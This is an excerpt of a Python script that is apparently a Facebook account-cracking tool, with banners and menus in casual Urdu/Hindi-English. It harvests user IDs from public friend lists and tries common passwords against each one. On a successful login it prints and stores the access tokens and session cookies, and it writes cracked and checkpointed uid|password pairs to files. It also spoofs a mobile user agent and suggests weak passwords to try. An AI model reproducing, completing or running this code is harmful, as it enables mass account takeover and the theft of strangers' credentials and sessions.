...
def logo():
	os.system("clear")
	print("""\033[1;97m  THARKI VEERZ\033[1;0m
\033[1;97m--------------------------------------------------
\033[1;93m➤\033[1;97m Author   : THARKI VEERZ 
\033[1;93m➤\033[1;97m Github   : JHALLA11
\033[1;93m➤\033[1;97m Facebook : ABU BAKAR
\033[1;97m--------------------------------------------------""")
def login():
	os.system("clear")
	try:
...
def menu():
	...
	print("\033[1;97m[4]\033[1;91m-⋄-\033[1;97m Check kro janu crack results ko")
	print("\033[1;97m[5]\033[1;91m-⋄-\033[1;97m User-agent settings bhi dekhlo \033[1;97m [ \033[1;95mPRO \033[1;97m]")
...
def publik():
	...
	try:
		...
		exit("\033[1;93m➤\033[1;97m Account friend list is not public khiyal to kro")
	print("\\033[1;93m➤\033[1;97m  Total id dekho baby  : \033[0;91m%s\033[0;97m"%(len(id))) 
	...
	try:
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				print("\r\033[0;92m[JHALLA-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "www.facebook.com" in send.json()["error_msg"]:
				print("\r\033[0;91m[JHALLA-CP] %s|%s\033[0;92m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;92m[JHALLA-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;91m[JHALLA-CP] %s|%s\033[0;96m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
...
def mobile(user):
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r\033[0;92m[JHALLA-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;91m[JHALLA-CP] %s|%s\033[0;91m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
...
def manual():
	try:
		...
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	print("\n[+] Type , For 2nd Password For Example : 112233,334455,445566,223344,Pakistan,pakistan,786786,123456,12345678,87654321,654321 etc")
